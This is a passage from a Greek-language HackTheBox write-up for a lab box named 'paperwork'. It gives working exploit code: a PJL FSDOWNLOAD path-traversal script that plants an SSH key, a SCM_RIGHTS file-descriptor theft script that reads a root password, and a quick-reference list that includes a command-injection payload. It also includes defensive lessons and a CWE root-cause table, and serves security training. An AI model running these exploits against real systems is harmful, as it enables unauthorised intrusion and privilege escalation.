+    <div class="term-body"><span class="pu">lp</span><span class="ps">@</span><span class="ph">paperwork</span><span class="ps">:</span><span class="pp">/opt/LPDServer</span><span class="ps">$ </span><span class="pc">python3 - &lt;&lt;'EOF'
+import socket
+KEY = b"ssh-ed25519 AAAA...snip... kali\n"
+p = '0:/../.ssh/authorized_keys'
+h = ('@PJL FSDOWNLOAD NAME="%s" SIZE=%d\r\n' % (p, len(KEY))).encode()
+s = socket.create_connection(("127.0.0.1", 9100)); s.sendall(h + KEY)
+print(s.recv(64))
+EOF</span><span class="po">
+b'OK\r\n'</span></div>
+  </div>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">ssh archivist@paperwork</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">ssh -i pw_key archivist@&lt;TARGET_IP&gt;</span>
+
+<span class="pu">archivist</span><span class="ps">@</span><span class="ph">paperwork</span><span class="ps">:</span><span class="pp">~</span><span class="ps">$ </span><span class="pc">id &amp;&amp; cat user.txt</span><span class="po">
+uid=1000(archivist) gid=1000(archivist) groups=1000(archivist)
+</span><span class="pg">[redacted — user flag]</span><span class="po"></span></div>
+  </div>
+
+  <div class="alert alert-info">Το <code>os.path.normpath</code> είναι canonicalisation string, όχι sandbox. Το να περιορίσεις ένα path σημαίνει να το κάνεις resolve (<code>realpath</code>) και να επιβεβαιώσεις ότι το αποτέλεσμα είναι ακόμα κάτω από τον επιδιωκόμενο root — <code>os.path.commonpath([root, resolved]) == root</code> — πριν αγγίξεις το filesystem.</div>
+
+  <!-- ══ ARCHIVIST -> ROOT ══ -->
+  <h2>archivist&nbsp;→&nbsp;root — Διαρρευσμένο File Descriptor μέσω SCM_RIGHTS</h2>
+
+  <p>Το <code>/usr/bin/paperwork-daemon</code> τρέχει σαν root και ακούει σε ένα UNIX socket. Δύο λεπτομέρειες έχουν σημασία:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">paperwork-daemon — the relevant bits</span>
+    </div>
+    <div class="term-body"><span class="po">admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)   </span><span class="pco"># opened once, as root</span><span class="po">
+LOG_PATH = "/home/archivist/printer/logs/commands.log"
+
+def scan_for_malice():
+    content = open(LOG_PATH).read().upper()
+    return any(t in content for t in ["FSQUERY", "FSUPLOAD", "FSDOWNLOAD"])
+
+def trigger_lockdown(conn):
+    log_fd = os.open(LOG_PATH, os.O_RDONLY)
+    evidence_bundle = array.array("i", [log_fd, admin_fd])
+    </span><span class="pr">conn.sendmsg([b"ALERT: SECURITY_VIOLATION..."],
+                 [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])</span><span class="po">
+
+def main():
+    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+    s.bind("/run/paperwork/mgmt.sock")
+    os.chmod(socket_path, 0o660); os.chown(socket_path, 0, 1000)   </span><span class="pco"># root:archivist</span><span class="po">
+    while True:
+        conn, _ = s.accept()
+        if scan_for_malice(): trigger_lockdown(conn)
+        else: conn.sendall(b"STATUS: SYSTEM_CLEAN\n...")</span></div>
+  </div>
+
+  <p>Το socket είναι mode <code>0660</code>, group <code>archivist</code> — οπότε μπορούμε να συνδεθούμε. Και όταν ο daemon αποφασίζει ότι το box έχει "παραβιαστεί", δεν το <em>αναφέρει</em> απλά — επισυνάπτει το <code>admin_fd</code> στην απάντηση σαν ancillary data. Το <code>SCM_RIGHTS</code> είναι ο μηχανισμός kernel για την αποστολή ενός ανοιχτού file descriptor πάνω από ένα UNIX socket: ο παραλήπτης παίρνει ένα ολοκαίνουριο fd στον δικό του πίνακα που αναφέρεται στην <em>ίδια ανοιχτή περιγραφή αρχείου</em> που είχε ήδη ο αποστολέας. Ο έλεγχος δικαιωμάτων συνέβη όταν ο <strong>root</strong> κάλεσε <code>open()</code>· το fd κουβαλά εκείνη την απόφαση. Όποιος το λάβει μπορεί να διαβάσει το αρχείο, ό,τι κι αν λένε τα permission bits.</p>
+
+  <p>Ελέγχουμε το trigger — το <code>scan_for_malice()</code> κάνει grep ένα αρχείο log που ανήκει στον <code>archivist</code>:</p>
+
+  <picture data-img-optimized="1"><source srcset="assets/htb-paperwork/img-scm-rights-fd-passing.webp" type="image/webp"><img class="screenshot" src="assets/htb-paperwork/img-scm-rights-fd-passing.png" alt="Step-by-step of the SCM_RIGHTS privilege escalation: archivist poisons the log, connects to the root daemon's UNIX socket, the daemon sendmsg()s its open descriptor for admin_pins.conf, archivist recvmsg()s the fd and preads the admin password, then su root" width="2320" height="1264" loading="lazy" decoding="async"></picture>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">getfd.py (run as archivist)</span>
+    </div>
+    <div class="term-body"><span class="po">import socket, os, array
+
+open("/home/archivist/printer/logs/commands.log", "a").write("FSDOWNLOAD\n")  </span><span class="pco"># trip the scan</span><span class="po">
+
+s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+s.connect("/run/paperwork/mgmt.sock")
+msg, anc, _, _ = s.recvmsg(4096, socket.CMSG_SPACE(64))
+
+for level, ctype, cdata in anc:
+    if (level, ctype) == (socket.SOL_SOCKET, socket.SCM_RIGHTS):
+        a = array.array("i"); a.frombytes(cdata)
+        for fd in a:
+            print(fd, os.readlink(f"/proc/self/fd/{fd}"))
+            print(os.pread(fd, 4096, 0))</span></div>
+  </div>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">archivist@paperwork</span>
+    </div>
+    <div class="term-body"><span class="pu">archivist</span><span class="ps">@</span><span class="ph">paperwork</span><span class="ps">:</span><span class="pp">~</span><span class="ps">$ </span><span class="pc">python3 getfd.py</span><span class="po">
+4 /home/archivist/printer/logs/commands.log
+5 /etc/paperwork/admin_pins.conf
+b'ADMIN_PASSWORD=</span><span class="pr">[redacted]</span><span class="po">\n'</span></div>
+  </div>
+
+  <p>Το αρχείο pin είναι <code>root:root 0600</code> — ο <code>archivist</code> δεν μπορεί να το κάνει <code>open()</code>. Δεν χρειάστηκε: ο daemon το άνοιξε και παρέδωσε το descriptor. Εκείνο το password είναι του root:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">su -</span>
+    </div>
+    <div class="term-body"><span class="pu">archivist</span><span class="ps">@</span><span class="ph">paperwork</span><span class="ps">:</span><span class="pp">~</span><span class="ps">$ </span><span class="pc">su -</span><span class="po">
+Password:
+</span><span class="pu">root</span><span class="ps">@</span><span class="ph">paperwork</span><span class="ps">:</span><span class="pp">~</span><span class="ps"># </span><span class="pc">id &amp;&amp; cat /root/root.txt</span><span class="po">
+uid=0(root) gid=0(root) groups=0(root)
+</span><span class="pg">[redacted — root flag]</span><span class="po"></span></div>
+  </div>
+
+  <div class="alert alert-success">Το να περάσεις ένα file descriptor είναι να περάσεις <em>πρόσβαση</em>, όχι ένα filename. Μια privileged διαδικασία που κάνει <code>sendmsg()</code> ένα fd σε έναν λιγότερο-privileged peer έχει μόλις delegate-άρει ό,τι μπορεί να κάνει εκείνο το fd. Αν ένας daemon πρέπει να μοιραστεί στοιχεία, θα έπρεπε να αντιγράψει τα bytes που σκοπεύει να αποκαλύψει — ποτέ το handle.</div>
+
+  <!-- ══ WRAP ══ -->
+  <h2>Γιατί Δούλεψε</h2>
+
+  <table class="st">
+    <tr><th>Σταδιο</th><th>Ριζα του προβληματος</th></tr>
+    <tr><td>lp</td><td><code>shell=True</code> + f-string παρεμβολή ενός job name ελεγχόμενου από το δίκτυο (CWE-78)</td></tr>
+    <tr><td>archivist</td><td>Path "sanitiser" που κάνει canonicalise αλλά ποτέ δεν περιορίζει· χωρίς <code>realpath</code> + έλεγχο prefix (CWE-22)</td></tr>
+    <tr><td>root</td><td>Privileged daemon στέλνει ένα ανοιχτό fd σε αρχείο μόνο-root σε έναν unprivileged client μέσω <code>SCM_RIGHTS</code> (CWE-732 / privilege delegation)</td></tr>
+  </table>
+
+  <h2>Βασικές εντολές</h2>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">quick reference</span>
+    </div>
+    <div class="term-body"><span class="pco"># Recon</span>
+<span class="pc">nmap -p- --min-rate 2000 -sC -sV &lt;TARGET_IP&gt;</span>
+<span class="pc">curl -s http://paperwork.htb/download/archive -o archive.zip &amp;&amp; unzip archive.zip</span>
+
+<span class="pco"># Foothold — command injection job-name LPD (θυρα 1515)</span>
+<span class="pc">python3 exploit.py       # 0x02 archive_intake → 0x02 "&lt;size&gt; cfA" → J';&lt;cmd&gt;;'</span>
+
+<span class="pco"># lp → archivist — path traversal PJL FSDOWNLOAD (θυρα 9100)</span>
+<span class="pc">@PJL FSDOWNLOAD NAME="0:/../.ssh/authorized_keys" SIZE=&lt;n&gt;\r\n&lt;pubkey&gt;</span>
+<span class="pc">ssh -i pw_key archivist@&lt;TARGET_IP&gt;</span>
+
+<span class="pco"># archivist → root — διαρροη fd SCM_RIGHTS</span>
+<span class="pc">echo FSDOWNLOAD &gt;&gt; ~/printer/logs/commands.log</span>
+<span class="pc">python3 getfd.py         # connect mgmt.sock → recvmsg() → pread(admin_fd)</span>
+<span class="pc">su -                     # ADMIN_PASSWORD</span></div>
+  </div>
+
+</div>
+<div class="htb-cta">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">My HTB profile &amp; more boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Open-source security &amp; automation tools</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+<footer>
+  <span>© 2026 <a href="https://s-markakis.github.io/index.html">S. Markakis</a></span>
+  <span><a href="https://s-markakis.github.io/blog.html">← Ολα τα posts</a></span>
+</footer>
+
+<script src="../js/i18n.js" defer></script>
+<script src="../js/nav.js" defer></script>
+<script src="../js/writeup-sidebar.js" defer></script>
+<script src="../js/writeup-enhance.js" defer></script>
+</body>
+</html>
